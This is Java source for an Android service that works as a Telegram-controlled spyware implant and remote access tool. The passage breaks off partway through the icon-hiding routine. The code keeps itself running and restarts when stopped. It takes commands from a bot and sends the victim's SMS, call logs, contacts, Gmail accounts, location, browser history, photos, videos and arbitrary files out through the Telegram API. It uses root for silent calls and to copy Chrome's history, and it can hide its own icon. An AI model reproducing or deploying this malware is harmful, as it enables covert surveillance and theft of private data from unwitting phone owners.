package com.tenix.recon;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.WallpaperManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.ImageFormat;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.telephony.TelephonyManager;
import android.view.Surface;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class inq extends Service {

    // ── CONFIG ────────────────────────────────
    static String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    static String OWNER_ID  = "YOUR_CHAT_ID_HERE";
    // ─────────────────────────────────────────

    private static volatile boolean running = false;
    private long lastUpdateId = 0;

    // Path lookup table (for Telegram 64-byte callback_data limit)
    private static final ConcurrentHashMap<String, String> PATH_MAP = new ConcurrentHashMap<>();
    private static final AtomicInteger pathCounter = new AtomicInteger(0);

    // ── SERVICE LIFECYCLE ────────────────────────
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        silentForeground();
        if (running) return START_STICKY;
        running = true;
        new Thread(() -> {
            stopForeground(true);
            try { mainLoop(); }
            catch (Exception ignored) {}
            finally { running = false; }
        }).start();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        scheduleRestart(3000);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        scheduleRestart(1000);
        super.onTaskRemoved(rootIntent);
    }

    @Override public IBinder onBind(Intent i) { return null; }

    // ── MAIN LOOP ────────────────────────────────
    private void mainLoop() {
        if (BOT_TOKEN.equals("YOUR_BOT_TOKEN_HERE") || OWNER_ID.equals("YOUR_CHAT_ID_HERE")) return;
        sendText("🟢 Online v1.1.1\n"
            + Build.MANUFACTURER + " " + Build.MODEL + "\n"
            + "Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")\n"
            + "Root: " + (hasRoot() ? "✅" : "❌") + "\n\n"
            + "/help for all commands", OWNER_ID);
        while (running) {
            try { pollOnce(); Thread.sleep(2000); }
            catch (InterruptedException e) { break; }
            catch (Exception ignored) {}
        }
    }

    // ── POLL ─────────────────────────────────────
    private void pollOnce() throws Exception {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN
            + "/getUpdates?timeout=25&offset=" + (lastUpdateId + 1);
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(30_000);
        c.setReadTimeout(30_000);
        int code = c.getResponseCode();
        if (code == 200) {
            BufferedReader br = new BufferedReader(
                new InputStreamReader(c.getInputStream(), "UTF-8"));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) sb.append(line);
            br.close();
            parseUpdates(sb.toString());
        }
        c.disconnect();
    }

    // ── PARSE UPDATES ────────────────────────────
    private void parseUpdates(String json) {
        int idx = 0;
        while (true) {
            int uPos = json.indexOf("\"update_id\"", idx);
            if (uPos < 0) break;
            int colon = json.indexOf(":", uPos);
            int comma = json.indexOf(",", colon);
            if (comma < 0) comma = json.indexOf("}", colon);
            if (comma < 0) break;
            long uid;
            try { uid = Long.parseLong(json.substring(colon + 1, comma).trim()); }
            catch (Exception e) { idx = uPos + 1; continue; }

            int nextUPos = json.indexOf("\"update_id\"", uPos + 1);

            if (uid > lastUpdateId) {
                lastUpdateId = uid;
                int cbPos = json.indexOf("\"callback_query\"", uPos);
                boolean isCb = cbPos >= 0 && (nextUPos < 0 || cbPos < nextUPos);

                if (isCb) {
                    String cbId   = extractStr(json, "\"id\"", cbPos);
                    String cbData = extractStr(json, "\"data\"", cbPos);
                    String chatId = extractChatId(json, cbPos);
                    if (cbId != null && cbData != null && !cbData.isEmpty())
                        handleCallback(cbId, cbData, chatId);
                } else {
                    String text = extractStr(json, "\"text\"", uPos);
                    if (text != null && !text.isEmpty()) {
                        String chatId = extractChatId(json, uPos);
                        handleCommand(text, chatId);
                    }
                }
            }
            idx = uPos + 1;
        }
    }

    private String extractStr(String json, String key, int from) {
        int kPos = json.indexOf(key, from);
        if (kPos < 0) return null;
        int col  = json.indexOf(":", kPos);
        int start = json.indexOf("\"", col + 1) + 1;
        if (start <= 0) return null;
        StringBuilder sb = new StringBuilder();
        int i = start;
        while (i < json.length()) {
            char ch = json.charAt(i);
            if (ch == '"' && json.charAt(i - 1) != '\\') break;
            sb.append(ch);
            i++;
        }
        return sb.toString();
    }

    private String extractChatId(String json, int from) {
        int chatPos = json.indexOf("\"chat\"", from);
        if (chatPos < 0) return OWNER_ID;
        int idPos = json.indexOf("\"id\"", chatPos);
        if (idPos < 0) return OWNER_ID;
        int col = json.indexOf(":", idPos);
        int end = json.indexOf(",", col);
        if (end < 0) end = json.indexOf("}", col);
        if (end < 0) return OWNER_ID;
        String id = json.substring(col + 1, end).trim();
        return id.isEmpty() ? OWNER_ID : id;
    }

    // ── COMMAND HANDLER ──────────────────────────
    private void handleCommand(String cmd, String chatId) {
        cmd = cmd.trim();
        // ── Info ──
        if      (cmd.startsWith("/info"))     sendText(getDeviceInfo(), chatId);
        else if (cmd.startsWith("/gmail"))    sendText(getGmailAccounts(), chatId);
        else if (cmd.startsWith("/battery"))  sendText(getBatteryInfo(), chatId);
        else if (cmd.startsWith("/net"))      sendText(getNetworkInfo(), chatId);
        else if (cmd.startsWith("/usage"))    sendText(getAppUsage(), chatId);
        else if (cmd.startsWith("/storage"))  sendText(getStorageInfo(), chatId);
        else if (cmd.startsWith("/apk"))      sendText(getInstalledApps(), chatId);
        else if (cmd.startsWith("/running"))  sendText(getRunningApps(), chatId);
        else if (cmd.startsWith("/newapps"))  sendText(getNewApps(), chatId);
        // ── Communication ──
        else if (cmd.startsWith("/sms"))      sendText(readSMS(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/calls"))    sendText(getCallLogs(arg(cmd, 10)), chatId);
        else if (cmd.startsWith("/contacts")) sendText(getContacts(30), chatId);
        // ── Location (Fix #1) ──
        else if (cmd.startsWith("/loc")) {
            sendText("📍 Getting GPS fix...", chatId);
            new Thread(() -> sendText(getLocationFresh(), chatId)).start();
        }
        // ── Browser ──
        else if (cmd.startsWith("/browser"))  sendText(getBrowserHistory(10), chatId);
        // ── Files with buttons ──
        else if (cmd.startsWith("/ls")) {
            String[] p = cmd.split(" ", 2);
            listFilesWithButtons(p.length > 1 ? p[1].trim() : "/sdcard/", chatId);
        }
        else if (cmd.startsWith("/get")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) sendFileCmd(p[1].trim(), chatId);
            else sendText("Usage: /get /sdcard/file.pdf", chatId);
        }
        // ── Gallery ──
        else if (cmd.startsWith("/photos")) {
            String a = argStr(cmd, "10");
            new Thread(() -> sendMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Images.Media.DATE_ADDED + " DESC",
                MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME,
                a.equalsIgnoreCase("all") ? 999 : safeInt(a, 10), chatId, "photo")).start();
        }
        else if (cmd.startsWith("/videos")) {
            String a = argStr(cmd, "10");
            new Thread(() -> sendMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                MediaStore.Video.Media.DATE_ADDED + " DESC",
                MediaStore.Video.Media.DATA, MediaStore.Video.Media.DISPLAY_NAME,
                a.equalsIgnoreCase("all") ? 999 : safeInt(a, 10), chatId, "video")).start();
        }
        // ── System actions ──
        else if (cmd.startsWith("/wallpaper")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) new Thread(() -> sendText(setWallpaper(p[1].trim()), chatId)).start();
            else sendText("Usage: /wallpaper https://example.com/img.jpg", chatId);
        }
        else if (cmd.startsWith("/call")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) makeCall(p[1].trim(), chatId);
            else sendText("Usage: /call +8801700000000", chatId);
        }
        else if (cmd.startsWith("/hide"))    hideIcon(chatId);
        else if (cmd.startsWith("/show"))    showIcon(chatId);
        else if (cmd.startsWith("/toast")) {
            String[] p = cmd.split(" ", 2);
            if (p.length > 1) showToast(p[1], chatId);
            else sendText("Usage: /toast Hello World", chatId);
        }
        else if (cmd.startsWith("/reboot"))  reboot(chatId);
        else if (cmd.startsWith("/wifipass")) sendText(getWifiPasswords(), chatId);
        else if (cmd.startsWith("/clipboard")) getClipboard(chatId);
        // ── Media capture ──
        else if (cmd.startsWith("/screen"))  new Thread(() -> takeScreenshot(chatId)).start();
        else if (cmd.startsWith("/mic")) {
            int secs = arg(cmd, 10);
            new Thread(() -> recordMic(secs, chatId)).start();
        }
        else if (cmd.startsWith("/cam")) {
            String[] p = cmd.split(" ");
            boolean front = p.length > 1 && p[1].equalsIgnoreCase("f");
            new Thread(() -> captureCamera(front, chatId)).start();
        }
        // ── Torch ──
        else if (cmd.startsWith("/flashlight")) {
            String[] p = cmd.split(" ");
            boolean on = p.length < 2 || !p[1].equalsIgnoreCase("off");
            sendText(toggleFlashlight(on), chatId);
        }
        else if (cmd.startsWith("/help"))    sendText(getHelp(), chatId);
    }

    // ── CALLBACK HANDLER ─────────────────────────
    private void handleCallback(String cbId, String data, String chatId) {
        answerCallback(cbId);
        if (data.startsWith("ls:")) {
            String path = PATH_MAP.getOrDefault(data.substring(3), data.substring(3));
            listFilesWithButtons(path, chatId);
        } else if (data.startsWith("get:")) {
            String path = PATH_MAP.getOrDefault(data.substring(4), data.substring(4));
            sendFileCmd(path, chatId);
        }
    }

    // ══════════════════════════════════════════════
    //  FIX #1 — LOCATION (active GPS + fallback)
    // ══════════════════════════════════════════════
    private String getLocationFresh() {
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) return "📍 Location service unavailable";

        final String[] out = {null};
        final CountDownLatch latch = new CountDownLatch(1);

        HandlerThread ht = new HandlerThread("gps_" + System.currentTimeMillis());
        ht.start();
        Handler handler = new Handler(ht.getLooper());

        LocationListener ll = new LocationListener() {
            @Override public void onLocationChanged(Location l) {
                out[0] = formatLocation(l, false);
                latch.countDown();
            }
            @Override public void onStatusChanged(String s, int i, Bundle b) {}
            @Override public void onProviderEnabled(String s) {}
            @Override public void onProviderDisabled(String s) {}
        };

        try {
            boolean gpsOn  = lm.isProviderEnabled(LocationManager.GPS_PROVIDER);
            boolean netOn  = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (!gpsOn && !netOn) {
                ht.quit();
                return "📍 GPS and Network are disabled on device";
            }
            if (gpsOn) {
                try { lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, ll, ht.getLooper()); }
                catch (SecurityException ignored) {}
            }
            if (netOn) {
                try { lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, ll, ht.getLooper()); }
                catch (SecurityException ignored) {}
            }

            latch.await(15, TimeUnit.SECONDS);

            if (out[0] == null) {
                // Fallback to cached
                Location loc = null;
                try { loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (SecurityException ignored) {}
                if (loc == null) {
                    try { loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (SecurityException ignored) {}
                }
                out[0] = loc != null ? formatLocation(loc, true) : "📍 Location not available";
            }
        } catch (Exception e) {
            out[0] = "📍 Error: " + e.getMessage();
        } finally {
            try { lm.removeUpdates(ll); } catch (Exception ignored) {}
            ht.quit();
        }
        return out[0];
    }

    private String formatLocation(Location l, boolean cached) {
        return "📍 Location" + (cached ? " (cached)" : "") + "\n\n"
            + "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude()
            + "\nLat: " + l.getLatitude()
            + "\nLng: " + l.getLongitude()
            + "\nAccuracy: " + (int) l.getAccuracy() + "m"
            + "\nProvider: " + l.getProvider();
    }

    // ══════════════════════════════════════════════
    //  FIX #2 — PHONE NUMBER
    // ══════════════════════════════════════════════
    @SuppressWarnings("NewApi")
    private String getPhoneNumber() {
        // Method 1: SubscriptionManager (API 22+, most reliable)
        if (Build.VERSION.SDK_INT >= 22) {
            try {
                android.telephony.SubscriptionManager sm =
                    android.telephony.SubscriptionManager.from(this);
                List<android.telephony.SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                if (subs != null) {
                    for (android.telephony.SubscriptionInfo si : subs) {
                        String n = si.getNumber();
                        if (n != null && !n.trim().isEmpty()) return n;
                    }
                }
            } catch (Exception ignored) {}
        }
        // Method 2: TelephonyManager
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                String n = tm.getLine1Number();
                if (n != null && !n.trim().isEmpty()) return n;
            }
        } catch (Exception ignored) {}
        return "Not available";
    }

    // ══════════════════════════════════════════════
    //  DEVICE INFO
    // ══════════════════════════════════════════════
    private String getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 Device Info\n\n");
        sb.append("Brand: ").append(Build.BRAND).append("\n");
        sb.append("Model: ").append(Build.MODEL).append("\n");
        sb.append("Android: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("Build: ").append(Build.DISPLAY).append("\n");
        sb.append("Root: ").append(hasRoot() ? "Yes" : "No").append("\n");
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
        } catch (Exception ignored) {}
        sb.append("Number: ").append(getPhoneNumber()).append("\n");
        return sb.toString();
    }

    private String getGmailAccounts() {
        try {
            android.accounts.Account[] accs =
                android.accounts.AccountManager.get(this).getAccountsByType("com.google");
            if (accs.length == 0) return "📧 No Gmail accounts";
            StringBuilder sb = new StringBuilder("📧 Gmail Accounts\n\n");
            for (int i = 0; i < accs.length; i++)
                sb.append(i + 1).append(". ").append(accs[i].name).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Gmail: " + e.getMessage(); }
    }

    private String getBatteryInfo() {
        try {
            Intent i = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (i == null) return "🔋 Unavailable";
            int level   = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale   = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int temp    = i.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
            int status  = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            int plugged = i.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
            int pct     = scale > 0 ? (int)(level * 100f / scale) : -1;
            String st   = status == BatteryManager.BATTERY_STATUS_CHARGING ? "⚡ Charging" : "🔋 Discharging";
            String src  = plugged == BatteryManager.BATTERY_PLUGGED_USB ? "USB" :
                          plugged == BatteryManager.BATTERY_PLUGGED_AC  ? "AC"  : "None";
            return "🔋 Battery\n\nLevel: " + pct + "%\nStatus: " + st
                + "\nSource: " + src + "\nTemp: " + temp + "°C";
        } catch (Exception e) { return "Battery: " + e.getMessage(); }
    }

    @SuppressWarnings("deprecation")
    private String getNetworkInfo() {
        StringBuilder sb = new StringBuilder("📡 Network\n\n");
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            if (wm != null && wm.isWifiEnabled()) {
                WifiInfo wi = wm.getConnectionInfo();
                int ip = wi.getIpAddress();
                sb.append("SSID: ").append(wi.getSSID()).append("\n");
                sb.append("IP: ").append((ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "."
                    + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF)).append("\n");
                sb.append("Signal: ").append(wi.getRssi()).append(" dBm\n\n");
            } else { sb.append("WiFi: Off\n\n"); }
        } catch (Exception ignored) { sb.append("WiFi: Error\n\n"); }
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (tm != null) {
                sb.append("Carrier: ").append(tm.getNetworkOperatorName()).append("\n");
                sb.append("SIM: ").append(tm.getSimOperatorName()).append("\n");
                sb.append("Number: ").append(getPhoneNumber()).append("\n");
            }
        } catch (Exception ignored) {}
        return sb.toString();
    }

    @SuppressWarnings("NewApi")
    private String getAppUsage() {
        try {
            android.app.usage.UsageStatsManager usm =
                (android.app.usage.UsageStatsManager) getSystemService("usagestats");
            if (usm == null) return "📊 Unavailable";
            long now = System.currentTimeMillis();
            List<android.app.usage.UsageStats> stats = usm.queryUsageStats(
                android.app.usage.UsageStatsManager.INTERVAL_DAILY, now - 86400000L, now);
            if (stats == null || stats.isEmpty())
                return "📊 Usage Stats\n\nGrant:\nSettings → Apps → Special Access → Usage Access";
            Collections.sort(stats,
                (a, b) -> Long.compare(b.getTotalTimeInForeground(), a.getTotalTimeInForeground()));
            StringBuilder sb = new StringBuilder("📊 App Usage (24h)\n\n");
            int shown = 0;
            for (android.app.usage.UsageStats s : stats) {
                long mins = s.getTotalTimeInForeground() / 60000;
                if (mins < 1) continue;
                sb.append(s.getPackageName()).append(": ").append(mins).append("m\n");
                if (++shown >= 10) break;
            }
            return shown == 0 ? "No usage data" : sb.toString();
        } catch (Exception e) { return "Usage: " + e.getMessage(); }
    }

    @SuppressWarnings("NewApi")
    private String getStorageInfo() {
        try {
            StatFs ext = new StatFs(Environment.getExternalStorageDirectory().getPath());
            StatFs in  = new StatFs(getFilesDir().getPath());
            long et, ef, it, inf;
            if (Build.VERSION.SDK_INT >= 18) {
                et = ext.getTotalBytes()/1048576; ef = ext.getAvailableBytes()/1048576;
                it = in.getTotalBytes()/1048576;  inf= in.getAvailableBytes()/1048576;
            } else {
                et  = (long)ext.getBlockCount()*ext.getBlockSize()/1048576;
                ef  = (long)ext.getAvailableBlocks()*ext.getBlockSize()/1048576;
                it  = (long)in.getBlockCount()*in.getBlockSize()/1048576;
                inf = (long)in.getAvailableBlocks()*in.getBlockSize()/1048576;
            }
            return "💾 Storage\n\nInternal: "+inf+"MB free / "+it+"MB\nExternal: "+ef+"MB free / "+et+"MB";
        } catch (Exception e) { return "Storage: " + e.getMessage(); }
    }

    private String getInstalledApps() {
        try {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder();
            int count = 0;
            for (ApplicationInfo a : apps) {
                if ((a.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    sb.append(a.loadLabel(getPackageManager())).append("\n")
                      .append(a.packageName).append("\n\n");
                    count++;
                }
            }
            return "📦 Apps (" + count + ")\n\n" + sb;
        } catch (Exception e) { return "Apps: " + e.getMessage(); }
    }

    private String getRunningApps() {
        try {
            android.app.ActivityManager am =
                (android.app.ActivityManager) getSystemService(ACTIVITY_SERVICE);
            if (am == null) return "⚙️ Unavailable";
            List<android.app.ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            if (procs == null || procs.isEmpty()) return "⚙️ No processes";
            StringBuilder sb = new StringBuilder("⚙️ Running Apps (" + procs.size() + ")\n\n");
            for (android.app.ActivityManager.RunningAppProcessInfo p : procs)
                sb.append(p.processName).append("\n");
            return sb.toString();
        } catch (Exception e) { return "Running: " + e.getMessage(); }
    }

    private String getNewApps() {
        try {
            List<ApplicationInfo> apps = getPackageManager().getInstalledApplications(0);
            long weekAgo = System.currentTimeMillis() - 7 * 24 * 60 * 60 * 1000L;
            StringBuilder sb = new StringBuilder("📲 New Apps (7 days)\n\n");
            int count = 0;
            for (ApplicationInfo a : apps) {
                if ((a.flags & ApplicationInfo.FLAG_SYSTEM) != 0) continue;
                try {
                    PackageInfo pi = getPackageManager().getPackageInfo(a.packageName, 0);
                    if (pi.firstInstallTime > weekAgo) {
                        sb.append(a.loadLabel(getPackageManager())).append("\n")
                          .append(a.packageName).append("\n\n");
                        count++;
                    }
                } catch (Exception ignored) {}
            }
            return count == 0 ? "📲 No new apps in 7 days" : sb.toString();
        } catch (Exception e) { return "New apps: " + e.getMessage(); }
    }

    // ══════════════════════════════════════════════
    //  BROWSER (FIX #3 — multi-URI + root Chrome)
    // ══════════════════════════════════════════════
    private String getBrowserHistory(int count) {
        String[] uris = {
            "content://com.android.browser/bookmarks",
            "content://com.sec.android.app.sbrowser/bookmarks",
            "content://browser/bookmarks",
            "content://com.mi.miui.browser/bookmarks",
            "content://com.uc.browser.provider/bookmarks"
        };
        for (String uriStr : uris) {
            try {
                Cursor c = getContentResolver().query(Uri.parse(uriStr),
                    new String[]{"title", "url"}, "visits > 0", null, "date DESC");
                if (c == null) continue;
                StringBuilder sb = new StringBuilder("🌐 Browser History\n\n");
                int i = 0;
                while (c.moveToNext() && i < count) {
                    String title = c.getString(0), url = c.getString(1);
                    if (url != null && url.startsWith("http")) {
                        sb.append(title != null && !title.isEmpty() ? title : url)
                          .append("\n").append(url).append("\n\n");
                        i++;
                    }
                }
                c.close();
                if (i > 0) return sb.toString();
            } catch (Exception ignored) {}
        }
        return getChromeHistoryRoot(count);
    }

    private String getChromeHistoryRoot(int count) {
        String[] paths = {
            "/data/data/com.android.chrome/app_chrome/Default/History",
            "/data/data/com.chrome.beta/app_chrome/Default/History",
            "/data/data/com.google.android.apps.chrome/app_chrome/Default/History"
        };
        for (String src : paths) {
            File dst = new File(getCacheDir(), "tmp_hist.db");
            try {
                if (dst.exists()) dst.delete();
                Process p = Runtime.getRuntime().exec(new String[]{
                    "su", "-c",
                    "cp " + src + " " + dst.getAbsolutePath()
                    + " && chmod 644 " + dst.getAbsolutePath()
                });
                p.waitFor();
                if (!dst.exists() || dst.length() == 0) continue;
                SQLiteDatabase db = SQLiteDatabase.openDatabase(
                    dst.getAbsolutePath(), null, SQLiteDatabase.OPEN_READONLY);
                Cursor c = db.rawQuery(
                    "SELECT title, url FROM urls ORDER BY last_visit_time DESC LIMIT " + count, null);
                StringBuilder sb = new StringBuilder("🌐 Chrome History\n\n");
                int i = 0;
                while (c.moveToNext()) {
                    String title = c.getString(0), url = c.getString(1);
                    if (url != null) {
                        sb.append(title != null && !title.isEmpty() ? title : url)
                          .append("\n").append(url).append("\n\n");
                        i++;
                    }
                }
                c.close(); db.close(); dst.delete();
                if (i > 0) return sb.toString();
            } catch (Exception ignored) { dst.delete(); }
        }
        return "🌐 Browser history not accessible (needs root for Chrome)";
    }

    // ══════════════════════════════════════════════
    //  COMMUNICATION
    // ══════════════════════════════════════════════
    private String getCallLogs(int count) {
        StringBuilder sb = new StringBuilder("📞 Call Logs\n\n");
        try {
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,
                new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION},
                null, null, CallLog.Calls.DATE + " DESC");
            if (c == null) return "📞 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                int type = c.getInt(1);
                String icon = type == CallLog.Calls.INCOMING_TYPE ? "📥" :
                              type == CallLog.Calls.OUTGOING_TYPE  ? "📤" : "📵";
                sb.append(icon).append(" ").append(c.getString(0))
                  .append(" (").append(c.getInt(2)).append("s)\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "Call logs: " + e.getMessage(); }
        return sb.toString();
    }

    private String readSMS(int count) {
        StringBuilder sb = new StringBuilder("💬 SMS Inbox\n\n");
        try {
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),
                new String[]{"address", "body"}, null, null, "date DESC");
            if (c == null) return "💬 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append("From: ").append(c.getString(0)).append("\n")
                  .append(c.getString(1)).append("\n\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "SMS: " + e.getMessage(); }
        return sb.toString();
    }

    private String getContacts(int count) {
        StringBuilder sb = new StringBuilder("👤 Contacts\n\n");
        try {
            Cursor c = getContentResolver().query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                }, null, null, null);
            if (c == null) return "👤 Unavailable";
            int i = 0;
            while (c.moveToNext() && i < count) {
                sb.append(c.getString(0)).append(": ").append(c.getString(1)).append("\n");
                i++;
            }
            c.close();
        } catch (Exception e) { return "Contacts: " + e.getMessage(); }
        return sb.toString();
    }

    // ══════════════════════════════════════════════
    //  FILES WITH INLINE BUTTONS
    // ══════════════════════════════════════════════
    private void listFilesWithButtons(String path, String chatId) {
        File dir = new File(path);
        if (!dir.exists()) { sendText("📂 Not found: " + path, chatId); return; }
        File[] files = dir.listFiles();
        if (files == null || files.length == 0) { sendText("📂 Empty: " + path, chatId); return; }

        // Sort: folders first, then by name
        java.util.Arrays.sort(files, (a, b) -> {
            if (a.isDirectory() != b.isDirectory()) return a.isDirectory() ? -1 : 1;
            return a.getName().compareToIgnoreCase(b.getName());
        });

        StringBuilder text = new StringBuilder("📂 ").append(path).append("\n\n");
        StringBuilder kb   = new StringBuilder("{\"inline_keyboard\":[");
        int shown = 0;
        for (File f : files) {
            if (shown >= 25) break; // Telegram inline keyboard limit
            text.append(f.isDirectory() ? "📁 " : "📄 ").append(f.getName());
            if (!f.isDirectory()) text.append(" (").append(f.length() / 1024).append("KB)");
            text.append("\n");

            // Store path in lookup table (Telegram caps callback_data at 64 bytes)
            String key = "p" + pathCounter.incrementAndGet();
            PATH_MAP.put(key, f.getAbsolutePath());

            String btnLabel  = f.isDirectory()
                ? "📂 " + truncate(f.getName(), 18)
                : "📤 " + truncate(f.getName(), 18);
            String cbData    = f.isDirectory() ? "ls:" + key : "get:" + key;

            if (shown > 0) kb.append(",");
            kb.append("[{\"text\":\"").append(escJson(btnLabel)).append("\",")
              .append("\"callback_data\":\"").append(cbData).append("\"}]");
            shown++;
        }
        if (files.length > 25) text.append("...and ").append(files.length - 25).append(" more");
        kb.append("]}");

        sendWithButtons(text.toString(), chatId, kb.toString());
    }

    private void sendFileCmd(String path, String chatId) {
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            sendText("📤 Sending: " + f.getName() + " (" + f.length() / 1024 + "KB)", chatId);
            int r = sendFile(f, f.getName(), chatId);
            if (r != 200) sendText("❌ Failed (code: " + r + ")", chatId);
        } else {
            sendText("❌ Not found: " + path, chatId);
        }
    }

    // ══════════════════════════════════════════════
    //  GALLERY
    // ══════════════════════════════════════════════
    private void sendMedia(Uri uri, String sort, String dataCol, String nameCol,
                           int count, String chatId, String type) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{dataCol, nameCol},
                null, null, sort);
            if (c == null) { sendText("❌ No " + type + "s found", chatId); return; }
            sendText("📤 Sending " + type + "s...", chatId);
            int sent = 0;
            while (c.moveToNext() && sent < count) {
                String path = c.getString(0);
                String name = c.getString(1);
                if (path == null) continue;
                File f = new File(path);
                if (!f.exists()) continue;
                int r = sendFile(f, name != null ? name : f.getName(), chatId);
                if (r == 200) sent++;
                try { Thread.sleep(400); } catch (Exception ignored) {}
            }
            c.close();
            sendText("✅ Sent " + sent + " " + type + "s", chatId);
        } catch (Exception e) { sendText("❌ Gallery: " + e.getMessage(), chatId); }
    }

    // ══════════════════════════════════════════════
    //  SYSTEM ACTIONS
    // ══════════════════════════════════════════════

    // Wallpaper (home + lock)
    @SuppressWarnings("NewApi")
    private String setWallpaper(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(30_000); c.setReadTimeout(60_000); c.connect();
            if (c.getResponseCode() != 200) { c.disconnect(); return "❌ Download failed"; }
            WallpaperManager wm = WallpaperManager.getInstance(this);
            InputStream is = c.getInputStream();
            if (Build.VERSION.SDK_INT >= 24) {
                wm.setStream(is, null, true,
                    WallpaperManager.FLAG_SYSTEM | WallpaperManager.FLAG_LOCK);
            } else {
                wm.setStream(is);
            }
            is.close(); c.disconnect();
            return "🖼️ Wallpaper set (home + lock)";
        } catch (Exception e) { return "❌ Wallpaper: " + e.getMessage(); }
    }

    // Call via device
    private void makeCall(String number, String chatId) {
        // Try root (silent, no screen)
        if (hasRoot()) {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{
                    "su", "-c", "am start -a android.intent.action.CALL -d tel:" + number
                });
                p.waitFor();
                sendText("📞 Calling: " + number, chatId);
                return;
            } catch (Exception ignored) {}
        }
        // Fallback: visible call intent
        try {
            Intent i = new Intent(Intent.ACTION_CALL);
            i.setData(Uri.parse("tel:" + number));
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            sendText("📞 Calling: " + number, chatId);
        } catch (Exception e) { sendText("❌ Call failed: " + e.getMessage(), chatId); }
    }

    // Hide/Show icon
    private void hideIcon(String chatId) {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
